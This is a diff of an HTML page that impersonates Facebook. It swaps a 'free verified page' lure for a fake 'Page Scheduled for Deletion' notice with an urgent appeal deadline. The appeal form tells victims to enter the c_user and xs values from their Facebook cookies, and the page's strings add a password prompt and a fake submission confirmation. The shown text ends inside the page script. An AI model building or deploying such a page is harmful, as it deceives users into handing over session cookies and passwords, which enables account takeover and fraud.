@@ -1,176 +1,1877 @@
-<html lang="en">
 
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>verified</title>
-    <link rel="icon" type="image/png" href="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Deletion Notice</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
         }
-
-        html,
+        
         body {
-            height: 0%;
-            width: 100%;
-        }
-
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
         }
-
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
+        
+        /* Header Styles */
+        .header {
+            background-color: #3b5998;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 10px 0;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo {
             display: flex;
             align-items: center;
-            flex-direction: column;
+            min-width: 120px;
         }
-
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
+        
+        .logo i {
+            font-size: 28px;
+            color: #ffffff;
+            margin-right: 8px;
         }
-
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
+        
+        .logo-text {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            white-space: nowrap;
         }
-
-        #data>h4 {
-            font-size: 25px;
+        
+        .search-bar {
+            flex: 1;
+            margin: 0 15px;
+            position: relative;
+            max-width: 500px;
+            min-width: 150px;
         }
-
-        #data>img {
-            width: 25px;
+        
+        .search-bar input {
+            width: 100%;
+            padding: 10px 15px 10px 40px;
+            border-radius: 20px;
+            border: none;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 14px;
+            transition: all 0.3s ease;
         }
-
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
+        
+        .search-bar input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
-
-        #para h2 {
-            font-size: 16px;
+        
+        .search-bar input:focus {
+            outline: none;
+            background-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.2);
         }
-
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #para p {
-            margin: 20px 100px 0px 100px;
+        
+        .search-bar i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.9);
             font-size: 14px;
         }
-
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
+        
+        /* Translation Button */
+        .translate-btn {
+            background-color: transparent;
             border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
+            color: white;
+            font-size: 14px;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 10px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
         }
-
-        #para button a {
+        
+        .translate-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .translate-btn i {
+            font-size: 16px;
+        }
+        
+        /* Secondary Navigation Bar */
+        .secondary-nav {
+            background-color: #ffffff;
+            border-bottom: 1px solid #dddfe2;
+            padding: 15px 0;
+            position: sticky;
+            top: 58px;
+            z-index: 99;
+        }
+        
+        .secondary-nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .secondary-nav h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+            color: #1c1e21;
+        }
+        
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            color: #e94342;
+        }
+        
+        .breadcrumb a {
+            color: #1877f2;
             text-decoration: none;
-            color: #fff;
+            display: flex;
+            align-items: center;
         }
-
-        #para button:hover {
-            background-color: #03469e;
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
         }
-
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
+        
+        .breadcrumb-separator {
+            margin: 0 8px;
+            color: #65676b;
+        }
+        
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        
+        /* Page Deletion Notice Section */
+        .deletion-notice {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+            border-left: 4px solid #ff4d4f;
+        }
+        
+        .deletion-notice-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .deletion-notice-icon {
+            background-color: #ff4d4f;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .deletion-notice-icon i {
+            color: white;
+            font-size: 18px;
+        }
+        
+        .deletion-notice-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1c1e21;
+        }
+        
+        .deletion-notice-subtitle {
+            font-size: 16px;
+            color: #606770;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .deletion-reasons {
+            background-color: #f9f9f9;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .deletion-reasons-title {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1c1e21;
+        }
+        
+        .deletion-reasons-list {
+            list-style-type: none;
+        }
+        
+        .deletion-reasons-list li {
+            margin-bottom: 10px;
+            padding-left: 25px;
+            position: relative;
+            color: #606770;
+        }
+        
+        .deletion-reasons-list li:before {
+            content: "•";
+            position: absolute;
+            left: 10px;
+            color: #ff4d4f;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .appeal-section {
+            margin-top: 35px;
+        }
+        
+        .appeal-section-title {
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+        }
+        
+        .appeal-section-title i {
+            margin-right: 10px;
+            color: #1877f2;
+        }
+        
+        .appeal-video-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto 15px;
+            background: #000;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: relative;
+            border: 3px solid #1877f2;
+        }
+        
+        .video-instruction {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 16px;
+            color: #606770;
+            font-weight: 600;
+        }
+        
+        .appeal-video-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .video-play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            z-index: 2;
+        }
+        
+        .video-play-button:hover {
+            background-color: rgba(0, 0, 0, 0.9);
+        }
+        
+        /* Language Selector Styles */
+        .language-selector-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .language-selector-popup {
+            background-color: white;
+            border-radius: 8px;
+            padding: 25px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .language-selector-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        
+        .language-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+        
+        .language-option {
+            padding: 12px 15px;
+            background-color: #f0f2f5;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .language-option .language-name {
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-align: left;
+        }
+        
+        .language-option .check-icon {
+            margin-left: 10px;
+            visibility: hidden;
+            width: 16px;
+            color: #1877f2;
+        }
+        
+        .language-option:hover {
+            background-color: #e4e6eb;
+        }
+        
+        .language-option.selected {
+            background-color: #1877f2;
+            color: white;
+        }
+        
+        .language-option.selected .check-icon {
+            visibility: visible;
+            color: white;
+        }
+        
+        .language-selector-actions {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .language-selector-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .language-selector-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .language-selector-button.secondary {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+        }
+        
+        .language-selector-button.secondary:hover {
+            background-color: #d8dadf;
+        }
+        
+        .appeal-form {
+            background-color: #ffffff;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            padding: 25px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #1c1e21;
+            font-size: 15px;
+        }
+        
+        .form-group input,
+        .form-group textarea,
+        .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: all 0.2s ease;
+            background-color: #f0f2f5;
+        }
+        
+        .form-group textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+        
+        .form-group input:focus,
+        .form-group textarea:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            background-color: #ffffff;
+        }
+        
+        .form-actions {
+            margin-top: 25px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 15px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+        }
+        
+        .btn-primary {
+            background-color: #1877f2;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-secondary {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #d8dadf;
+        }
+        
+        .appeal-instructions {
+            background-color: #f0f8ff;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 30px;
+            border-left: 4px solid #1877f2;
+        }
+        
+        .appeal-instructions-title {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1877f2;
+            display: flex;
+            align-items: center;
+        }
+        
+        .appeal-instructions-title i {
+            margin-right: 10px;
+        }
+        
+        .appeal-instructions-list {
+            padding-left: 20px;
+        }
+        
+        .appeal-instructions-list li {
+            margin-bottom: 10px;
+            color: #606770;
+            line-height: 1.5;
+        }
+        
+        .additional-help {
+            margin-top: 40px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+        
+        .additional-help-title {
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        
+        .help-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+        }
+        
+        .help-link-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border-radius: 6px;
+            transition: background-color 0.2s ease;
+        }
+        
+        .help-link-item:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .help-link-icon {
+            margin-right: 12px;
+            color: #1877f2;
+            font-size: 18px;
+        }
+        
+        .help-link-text {
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #ffffff;
+            border-top: 1px solid #dddfe2;
+            padding: 30px 0;
+            margin-top: 50px;
+        }
+        
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 13px;
+            white-space: nowrap;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #8a8d91;
+            font-size: 12px;
+            line-height: 1.5;
+        }
+        
+        /* Password Prompt Styles */
+        .password-prompt-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .password-prompt {
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .password-prompt-header {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #dddfe2;
+            background-color: #f0f2f5;
+        }
+        
+        .password-prompt-header h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #1c1e21;
+        }
+        
+        .password-prompt-body {
+            padding: 20px;
+        }
+        
+        .password-prompt-body p {
+            margin-bottom: 15px;
+            color: #606770;
+            font-size: 14px;
+        }
+        
+        .password-prompt-body input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .password-prompt-body input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .password-prompt-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .password-prompt-actions button {
+            padding: 8px 16px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .password-prompt-actions button.primary {
+            background-color: #1877f2;
+            color: white;
+        }
+        
+        .password-prompt-actions button.primary:hover {
+            background-color: #166fe5;
+        }
+        
+        .password-prompt-actions button:not(.primary) {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+        }
+        
+        .password-prompt-actions button:not(.primary):hover {
+            background-color: #d8dadf;
+        }
+        
+        .password-help {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-container {
+                padding: 0 15px;
             }
-            #box>img {
-                width: 40px;
+            
+            .logo i {
+                font-size: 24px;
             }
-            #data>h4 {
-                font-size: 18px;
+            
+            .logo-text {
+                font-size: 16px;
             }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
+            
+            .search-bar input {
+                padding: 8px 12px 8px 35px;
+                font-size: 13px;
             }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
+            
+            .translate-btn {
                 font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
+                padding: 4px 8px;
             }
-            #para>p {
-                margin: 5px 15px 0px 15px;
+            
+            .secondary-nav-container {
+                padding: 0 15px;
+            }
+            
+            .container {
+                padding: 0 15px;
+            }
+            
+            .deletion-notice {
+                padding: 20px;
+            }
+            
+            .deletion-notice-title {
+                font-size: 20px;
+            }
+            
+            .appeal-form {
+                padding: 20px;
+            }
+            
+            .form-actions {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .btn {
+                width: 100%;
+            }
+            
+            .language-selector-popup {
+                padding: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .deletion-notice-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .deletion-notice-icon {
+                margin-bottom: 15px;
+                margin-right: 0;
+            }
+            
+            .help-links {
+                grid-template-columns: 1fr;
+            }
+            
+            .language-selector-popup {
+                padding: 15px;
+                width: 95%;
+            }
+            
+            .language-option {
+                padding: 10px 12px;
                 font-size: 14px;
             }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
+            
+            .language-selector-actions {
+                flex-direction: column;
+            }
+            
+            .language-selector-button {
+                width: 100%;
+            }
+            
+            .password-prompt-actions {
+                flex-direction: column;
+            }
+            
+            .password-prompt-actions button {
+                width: 100%;
             }
         }
     </style>
 </head>
-
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085" alt="">
-            <h5 id="groupSubHeader">Facebook Security</h5>
-            <div id="data">
-                <h4>free service</h4> <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/bluetick.png?v=1737135548362" alt="">
+    <!-- Header -->
+    <header class="header">
+        <div class="header-container">
+            <div class="logo">
+                <i class="fab fa-facebook"></i>
+                <span class="logo-text" data-translate="facebook">Facebook</span>
             </div>
-            <div class="line"></div>
-            <div id="para">
-                <h2> 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬! 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝 𝐟𝐨𝐫 𝐚 𝐟𝐫𝐞𝐞 𝐯𝐞𝐫𝐢𝐟𝐢𝐞𝐝 𝐩𝐚𝐠𝐞.</h2>click on continue
-                <p>
-                    </p>
-                <button> <a href="help.html">Continue</a> </button>
+            
+            <div class="search-bar">
+                <i class="fas fa-search"></i>
+                <input type="text" placeholder="How can we help?" data-placeholder="search_placeholder">
+            </div>
+
+            <button class="translate-btn" id="translate-btn">
+                <i class="fas fa-language"></i>
+                <span data-translate="translate">Translate</span>
+            </button>
+        </div>
+    </header>
+    
+    <!-- Secondary Navigation Bar -->
+    <div class="secondary-nav">
+        <div class="secondary-nav-container">
+            <div class="breadcrumb">
+                <a href="#"><i class="fas fa-home"></i> <span data-translate="home">Home</span></a>
+                <span class="breadcrumb-separator">/</span>
+                <span data-translate="page_deletion">Page Deletion Notice</span>
             </div>
         </div>
     </div>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Page Deletion Notice Section -->
+        <section class="deletion-notice">
+            <div class="deletion-notice-header">
+                <div class="deletion-notice-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <h1 class="deletion-notice-title" data-translate="page_scheduled">Page Scheduled for Deletion</h1>
+            </div>
+            
+            <div class="deletion-reasons">
+                <h3 class="deletion-reasons-title" data-translate="reasons_title">Reasons for this action:</h3>
+                <ul class="deletion-reasons-list">
+                    <li data-translate="reason1">Content that violates our Community Standards</li>
+                    <li data-translate="reason2">Repeated violations of our policies</li>
+                    <li data-translate="reason3">Inauthentic behavior or misleading content</li>
+                    <li data-translate="reason4">Spam or deceptive practices</li>
+                </ul>
+            </div>
+            
+            <div class="appeal-section">
+                <h2 class="appeal-section-title"><i class="fas fa-undo"></i> <span data-translate="appeal_title">Appeal This Decision Within 24 Hours</span></h2>
+                
+                <div class="appeal-video-container">
+                    <video id="appeal-video" poster="https://via.placeholder.com/600x338/f0f2f5/1877f2?text=Appeal+Process+Video">
+                        <source src="https://ik.imagekit.io/6zsbaguopp/english.mp4" type="video/mp4">
+                        <span data-translate="video_not_supported">Your browser does not support the video tag.</span>
+                    </video>
+                    
+                    <button class="video-play-button" id="play-video-btn">
+                        <i class="fas fa-play"></i> <span data-translate="play_video">Play Video</span>
+                    </button>
+                </div>
+                
+                <div class="video-instruction" data-translate="watch_instruction">Watch the video to learn how to appeal</div>
+                
+                <!-- Language Selector Popup -->
+                <div class="language-selector-overlay" id="language-selector" style="display: none;">
+                    <div class="language-selector-popup">
+                        <h3 class="language-selector-title" data-translate="select_language">Select Video Language</h3>
+                        <div class="language-options">
+                            <div class="language-option selected" data-lang="english" data-src="https://ik.imagekit.io/mmodwqv6i/English.mp4">
+                                <span class="language-name">English</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="spanish" data-src="https://ik.imagekit.io/xpne13huk/Spanish.mp4">
+                                <span class="language-name">Español (Spanish)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="hindi" data-src="https://ik.imagekit.io/9s8e9xlpt/Hindi.mp4">
+                                <span class="language-name">हिन्दी (Hindi)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="arabic" data-src="https://ik.imagekit.io/iev0ku3oe/Arabic.mp4">
+                                <span class="language-name">العربية (Arabic)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="tamil" data-src="https://ik.imagekit.io/luit2bleh/Tamil.mp4">
+                                <span class="language-name">தமிழ் (Tamil)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                        </div>
+                        <div class="language-selector-actions">
+                            <button class="language-selector-button secondary" id="cancel-language-btn">
+                                <span data-translate="cancel">Cancel</span>
+                            </button>
+                            <button class="language-selector-button" id="confirm-language-btn">
+                                <i class="fas fa-play"></i> <span data-translate="play_video">Play Video</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Translation Selector Popup -->
+                <div class="language-selector-overlay" id="translation-selector" style="display: none;">
+                    <div class="language-selector-popup">
+                        <h3 class="language-selector-title" data-translate="select_language">Select Page Language</h3>
+                        <div class="language-options">
+                            <div class="language-option selected" data-lang="en">
+                                <span class="language-name">English</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="es">
+                                <span class="language-name">Español (Spanish)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="fr">
+                                <span class="language-name">Français (French)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="de">
+                                <span class="language-name">Deutsch (German)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="hi">
+                                <span class="language-name">हिन्दी (Hindi)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="ar">
+                                <span class="language-name">العربية (Arabic)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                            <div class="language-option" data-lang="ta">
+                                <span class="language-name">தமிழ் (Tamil)</span>
+                                <i class="fas fa-check check-icon"></i>
+                            </div>
+                        </div>
+                        <div class="language-selector-actions">
+                            <button class="language-selector-button secondary" id="cancel-translation-btn">
+                                <span data-translate="cancel">Cancel</span>
+                            </button>
+                            <button class="language-selector-button" id="confirm-translation-btn">
+                                <i class="fas fa-check"></i> <span data-translate="apply">Apply</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="appeal-form">
+                    <div class="form-group">
+                        <label for="c_user" data-translate="c_user_label">c_user Value</label>
+                        <input type="text" id="c_user" data-placeholder="c_user_placeholder" placeholder="Enter your c_user value (numbers only)" pattern="\d+" title="Please enter numbers only" required="">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="xs" data-translate="xs_label">xs Value</label>
+                        <input type="text" id="xs" placeholder="Enter your xs value (combination of letters, numbers, symbols)" pattern="[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':&quot;\\|,.<>\/?]+" required>
+                    </div>
+                    
+                    <div class="form-actions">
+                        <button type="button" class="btn btn-secondary" data-translate="cancel">Cancel</button>
+                        <button type="submit" class="btn btn-primary" id="submit-appeal-btn" data-translate="submit_appeal">Submit Appeal</button>
+                    </div>
+                </div>
+                
+                <div class="appeal-instructions">
+                    <h3 class="appeal-instructions-title"><i class="fas fa-info-circle"></i> <span data-translate="instructions_title">Appeal Instructions</span></h3>
+                    <ol class="appeal-instructions-list">
+                        <li data-translate="instruction1">Provide accurate c_user and xs values from your Facebook cookies</li>
+                        <li data-translate="instruction2">The c_user value should contain only numbers</li>
+                        <li data-translate="instruction3">The xs value should contain letters, numbers, and symbols</li>
+                        <li data-translate="instruction4">Our team will review your appeal and respond via email</li>
+                        <li data-translate="instruction5">Appeals are typically processed within 7 business days</li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+        
+        <section class="additional-help">
+            <h2 class="additional-help-title" data-translate="additional_help">Additional Help Resources</h2>
+            <div class="help-links">
+                <a href="#" class="help-link-item">
+                    <div class="help-link-icon">
+                        <i class="fas fa-book"></i>
+                    </div>
+                    <div class="help-link-text" data-translate="community_standards">Community Standards</div>
+                </a>
+                
+                <a href="#" class="help-link-item">
+                    <div class="help-link-icon">
+                        <i class="fas fa-question-circle"></i>
+                    </div>
+                    <div class="help-link-text" data-translate="help_center">Help Center</div>
+                </a>
+                
+                <a href="#" class="help-link-item">
+                    <div class="help-link-icon">
+                        <i class="fas fa-file-alt"></i>
+                    </div>
+                    <div class="help-link-text" data-translate="terms_service">Terms of Service</div>
+                </a>
+                
+                <a href="#" class="help-link-item">
+                    <div class="help-link-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <div class="help-link-text" data-translate="privacy_policy">Privacy Policy</div>
+                </a>
+            </div>
+        </section>
+    </div>
+    
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-links">
+                <a href="#" data-translate="about">About</a>
+                <a href="#" data-translate="privacy_policy">Privacy Policy</a>
+                <a href="#" data-translate="terms_service">Terms of Service</a>
+                <a href="#" data-translate="help_center">Help Center</a>
+                <a href="#" data-translate="cookies">Cookies</a>
+                <a href="#" data-translate="careers">Careers</a>
+                <a href="#" data-translate="contact">Contact Us</a>
+                <a href="#" data-translate="community_standards">Community Standards</a>
+            </div>
+            <div class="copyright">
+                <p data-translate="copyright1">© 2025 Meta Platforms, Inc.</p>
+            </div>
+        </div>
+    </footer>
+    
+    <script>
+        // Complete translation dictionary
+        const translations = {
+            en: {
+                facebook: "Facebook",
+                search_placeholder: "How can we help?",
+                translate: "Translate",
+                home: "Home",
+                page_deletion: "Page Deletion Notice",
+                page_scheduled: "Page Scheduled for Deletion",
+                reasons_title: "Reasons for this action:",
+                reason1: "Content that violates our Community Standards",
+                reason2: "Repeated violations of our policies",
+                reason3: "Inauthentic behavior or misleading content",
+                reason4: "Spam or deceptive practices",
+                appeal_title: "Appeal This Decision Within 24 Hours",
+                play_video: "Play Video",
+                video_not_supported: "Your browser does not support the video tag.",
+                watch_instruction: "Watch the video to learn how to appeal",
+                select_language: "Select Language",
+                cancel: "Cancel",
+                apply: "Apply",
+                c_user_label: "c_user Value",
+                c_user_placeholder: "Enter your c_user value (numbers only)",
+                xs_label: "xs Value",
+                xs_placeholder: "Enter your xs value (combination of letters, numbers, symbols)",
+                submit_appeal: "Submit Appeal",
+                instructions_title: "Appeal Instructions",
+                instruction1: "Provide accurate c_user and xs values from your Facebook cookies",
+                instruction2: "The c_user value should contain only numbers",
+                instruction3: "The xs value should contain letters, numbers, and symbols",
+                instruction4: "Our team will review your appeal and respond via email",
+                instruction5: "Appeals are typically processed within 7 business days",
+                additional_help: "Additional Help Resources",
+                community_standards: "Community Standards",
+                help_center: "Help Center",
+                terms_service: "Terms of Service",
+                privacy_policy: "Privacy Policy",
+                about: "About",
+                cookies: "Cookies",
+                careers: "Careers",
+                contact: "Contact Us",
+                copyright1: "© 2025 Meta Platforms, Inc.",
+                security_verification: "Security Verification",
+                enter_password: "For security purposes, please enter your Facebook password to confirm your identity:",
+                enter_password_placeholder: "Enter your password",
+                forgot_password: "Forgot password?",
+                continue: "Continue",
+                appeal_submitted: "Appeal Submitted",
+                appeal_success: "Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.",
+                ok: "OK",
+                processing: "Processing...",
